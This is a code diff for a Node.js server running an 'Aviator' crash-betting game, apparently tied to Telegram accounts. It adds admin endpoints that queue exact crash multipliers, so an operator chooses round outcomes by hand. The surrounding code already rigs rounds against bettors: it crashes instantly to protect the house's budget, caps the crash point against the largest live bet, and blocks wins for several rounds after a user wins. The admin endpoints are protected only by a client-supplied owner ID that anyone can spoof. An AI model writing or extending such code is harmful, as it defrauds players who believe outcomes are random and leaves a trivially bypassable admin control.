@@ -1797,6 +1797,7 @@ function makeAviatorPool() {
     totalPool: 0,                // sum of all bets this round
     totalPaidOut: 0,             // running sum of cashouts
     userCooldown: {},            // { telegramId: cooldownUntilRound } — blocks wins for 4-6 rounds after a win
+    manualQueue: [],             // FIFO queue of admin-set crash multipliers (used before any auto/random logic)
   };
 }
 const aviatorState = {
@@ -1839,33 +1840,47 @@ async function aviatorPhaseTick(currency) {
       s.maxPayout = s.totalPool * (1 - profitPct / 100);
       // Initial cap: random fallback. Will be tightened dynamically.
       s.crashAt = randomCrashPoint();
+      s.manualOverride = false;
 
-      // Pre-rig: if even the smallest possible cashout (any bet × 1.01x) would already exceed budget,
-      // crash instantly. Common when 1 user bets and profit% >= ~0% → max mult < 1.
-      let maxBet = 0;
-      for (const k of Object.keys(s.bets)) {
-        if (s.bets[k].amount > maxBet) maxBet = s.bets[k].amount;
+      // Admin manual override: if queue non-empty, dequeue and use that crash point.
+      // This bypasses house-edge cap (admin is fully in control).
+      if (Array.isArray(s.manualQueue) && s.manualQueue.length > 0) {
+        const next = Number(s.manualQueue.shift());
+        if (!isNaN(next) && next >= 1.0) {
+          s.crashAt = Number(next.toFixed(2));
+          s.manualOverride = true;
+        }
       }
-      if (maxBet > 0) {
-        const dynCap = s.maxPayout / maxBet;
-        if (dynCap < s.crashAt) s.crashAt = Math.max(1.0, dynCap);
+
+      if (!s.manualOverride) {
+        // Pre-rig: if even the smallest possible cashout (any bet × 1.01x) would already exceed budget,
+        // crash instantly. Common when 1 user bets and profit% >= ~0% → max mult < 1.
+        let maxBet = 0;
+        for (const k of Object.keys(s.bets)) {
+          if (s.bets[k].amount > maxBet) maxBet = s.bets[k].amount;
+        }
+        if (maxBet > 0) {
+          const dynCap = s.maxPayout / maxBet;
+          if (dynCap < s.crashAt) s.crashAt = Math.max(1.0, dynCap);
+        }
       }
     }
   } else if (s.phase === "flying") {
     const elapsed = now - s.flightStartTime;
     const m = aviatorMultiplierAt(elapsed);
 
-    // Dynamic house-edge cap: even if the largest remaining bettor cashes out NOW,
-    // total paid out must not exceed maxPayout. Tighten s.crashAt accordingly.
-    const remainingBudget = Math.max(0, (s.maxPayout || 0) - s.totalPaidOut);
-    let maxRemainingBet = 0;
-    for (const k of Object.keys(s.bets)) {
-      const b = s.bets[k];
-      if (!b.cashedOutAt && b.amount > maxRemainingBet) maxRemainingBet = b.amount;
-    }
-    if (maxRemainingBet > 0) {
-      const dynCap = Math.max(1.0, remainingBudget / maxRemainingBet);
-      if (dynCap < s.crashAt) s.crashAt = Number(dynCap.toFixed(2));
+    // Dynamic house-edge cap (skipped when admin manual override is active).
+    if (!s.manualOverride) {
+      const remainingBudget = Math.max(0, (s.maxPayout || 0) - s.totalPaidOut);
+      let maxRemainingBet = 0;
+      for (const k of Object.keys(s.bets)) {
+        const b = s.bets[k];
+        if (!b.cashedOutAt && b.amount > maxRemainingBet) maxRemainingBet = b.amount;
+      }
+      if (maxRemainingBet > 0) {
+        const dynCap = Math.max(1.0, remainingBudget / maxRemainingBet);
+        if (dynCap < s.crashAt) s.crashAt = Number(dynCap.toFixed(2));
+      }
     }
 
     if (m >= s.crashAt || elapsed >= AVIATOR_PHASE.flying) {
@@ -2046,7 +2061,8 @@ app.post("/api/aviator/cashout", async (req, res) => {
       game: "aviator",
     });
 
-    // House-edge enforcement: keep at least profit% of pool.
+    // House-edge enforcement: keep at least profit% of pool. Skipped when admin manual override is active.
+    if (!s.manualOverride) {
     const profitPct = await getAviatorProfitPercent();
     const maxPayout = s.totalPool * (1 - profitPct / 100);
     let remainingExposure = 0;
@@ -2063,6 +2079,7 @@ app.post("/api/aviator/cashout", async (req, res) => {
         const safeTarget = Math.max(1.01, Math.min(s.crashAt, Number(targetMult.toFixed(2))));
         if (safeTarget < s.crashAt) s.crashAt = safeTarget;
       }
+    }
     }
 
     res.json({
@@ -2117,7 +2134,66 @@ app.post("/api/admin/aviator/profit", async (req, res) => {
   }
 });
 
-// SPA fallback - serve index.html for all non-API routes
+// ============================================
+// Aviator manual crash queue (admin control)
+// Admin queues exact crash multipliers per currency. Each round consumes one
+// from the head of the queue and uses it as the crash point — bypassing the
+// auto profit cap. When the queue is empty, normal profit% logic resumes.
+// ============================================
+function getAviatorCurr(req) {
+  const c = (req.body && req.body.currency) || req.query.currency;
+  return c === "star" ? "star" : "dollar";
+}
+
+app.get("/api/admin/aviator/manual", (req, res) => {
+  if (String(req.query.ownerId) !== "6965488457") return res.status(403).json({ error: "Unauthorized" });
+  const curr = getAviatorCurr(req);
+  const s = aviatorState[curr];
+  res.json({ currency: curr, queue: s.manualQueue || [], active: !!s.manualOverride, currentCrashAt: s.crashAt });
+});
+
+app.post("/api/admin/aviator/manual/add", (req, res) => {
+  const { ownerId, value } = req.body || {};
+  if (String(ownerId) !== "6965488457") return res.status(403).json({ error: "Unauthorized" });
+  const curr = getAviatorCurr(req);
+  const num = Number(value);
+  if (isNaN(num) || num < 1.0 || num > 1000) return res.status(400).json({ error: "Value must be between 1.00 and 1000" });
+  const s = aviatorState[curr];
+  s.manualQueue = s.manualQueue || [];
+  s.manualQueue.push(Number(num.toFixed(2)));
+  res.json({ success: true, queue: s.manualQueue });
+});
+
+app.post("/api/admin/aviator/manual/set", (req, res) => {
+  const { ownerId, queue } = req.body || {};
+  if (String(ownerId) !== "6965488457") return res.status(403).json({ error: "Unauthorized" });
+  if (!Array.isArray(queue)) return res.status(400).json({ error: "queue must be an array" });
+  const curr = getAviatorCurr(req);
+  const cleaned = queue.map((v) => Number(v)).filter((n) => !isNaN(n) && n >= 1.0 && n <= 1000).map((n) => Number(n.toFixed(2)));
+  aviatorState[curr].manualQueue = cleaned;
+  res.json({ success: true, queue: cleaned });
+});
+
+app.post("/api/admin/aviator/manual/clear", (req, res) => {
+  const { ownerId } = req.body || {};
+  if (String(ownerId) !== "6965488457") return res.status(403).json({ error: "Unauthorized" });
+  const curr = getAviatorCurr(req);
+  aviatorState[curr].manualQueue = [];
+  res.json({ success: true });
+});
+
+app.post("/api/admin/aviator/manual/remove", (req, res) => {
+  const { ownerId, index } = req.body || {};
+  if (String(ownerId) !== "6965488457") return res.status(403).json({ error: "Unauthorized" });
+  const curr = getAviatorCurr(req);
+  const s = aviatorState[curr];
+  const i = Number(index);
+  if (isNaN(i) || i < 0 || i >= (s.manualQueue || []).length) return res.status(400).json({ error: "Invalid index" });
+  s.manualQueue.splice(i, 1);
+  res.json({ success: true, queue: s.manualQueue });
+});
+
+
 app.get("*", (req, res) => {
   res.sendFile(path.join(__dirname, "../public/index.html"));
 });
